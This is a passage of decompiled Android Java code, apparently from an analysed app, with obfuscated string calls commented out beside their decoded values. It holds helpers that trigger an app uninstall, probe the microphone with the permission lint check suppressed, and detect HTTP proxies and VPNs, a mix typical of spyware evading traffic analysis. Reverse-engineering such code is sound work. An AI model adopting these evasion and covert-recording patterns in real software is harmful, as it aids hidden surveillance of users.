        Intent intent = new Intent("android.intent.action.DELETE", parse);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setData(parse);
        context.startActivity(intent);
        return;
    }

    public static boolean validateMicAvailability() {
        Boolean bool = true;
        @SuppressLint("MissingPermission")
        AudioRecord audioRecord = new AudioRecord(1, SrsFlvMuxer.SrsCodecAudioSampleRate.R44100, 16, 1, SrsFlvMuxer.SrsCodecAudioSampleRate.R44100);
        try {
            if (audioRecord.getRecordingState() != 1) {
                bool = false;
            }
            audioRecord.startRecording();
            if (audioRecord.getRecordingState() != 3) {
                audioRecord.stop();
                bool = false;
            }
            audioRecord.stop();
            audioRecord.release();
            return bool.booleanValue();
        } catch (Throwable th) {
            audioRecord.release();
            throw th;
        }
    }

    public static boolean isWifiProxy(Context context) {
        int port;
        String str;
        boolean z = true;
        if (Build.VERSION.SDK_INT >= 14) {
//             String property = System.getProperty(bb7d7pu7.m5998("AR0dGUcZGwYRECEGGh0"));
            String property = System.getProperty("http.proxyHost");
            str = property;
            if (TextUtils.isEmpty(property)) {
//                 str = System.getProperty(bb7d7pu7.m5998("AR0dGRpHGRsGERAhBhod"));
                str = System.getProperty("https.proxyHost");
            }
//             String property2 = System.getProperty(bb7d7pu7.m5998("AR0dGUcZGwYREDkGGx0"));
            String property2 = System.getProperty("http.proxyPort");
            String str2 = property2;
            if (TextUtils.isEmpty(property2)) {
//                 str2 = System.getProperty(bb7d7pu7.m5998("AR0dGRpHGRsGERA5Bhsd"));
                str2 = System.getProperty("https.proxyPort");
            }
            if (str2 == null) {
//                 str2 = bb7d7pu7.m5998("RFg");
                str2 = "-1";
            }
            port = Integer.parseInt(str2);
        } else {
            String host = Proxy.getHost(context);
            port = Proxy.getPort(context);
            str = host;
        }
        if (TextUtils.isEmpty(str) || port == -1) {
            z = false;
        }
        return z;
    }

    public static boolean checkVPN(Context context) {
        boolean hasTransport;
//         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(bb7d7pu7.m5998("CgYHBwwKHQAfAB0Q"));
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT >= 23) {
            Network activeNetwork = connectivityManager.getActiveNetwork();
            if (activeNetwork != null) {
                NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(activeNetwork);
                if (networkCapabilities != null) {
                    hasTransport = networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN);
                    return hasTransport;
                }
            }
        }
        hasTransport = false;
        return hasTransport;
    }

    public static String array2String(Object[] objArr) {
        if (objArr == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder();
        for (Object obj : objArr) {
            sb.append(obj);
        }
        return sb.toString();
    }
}
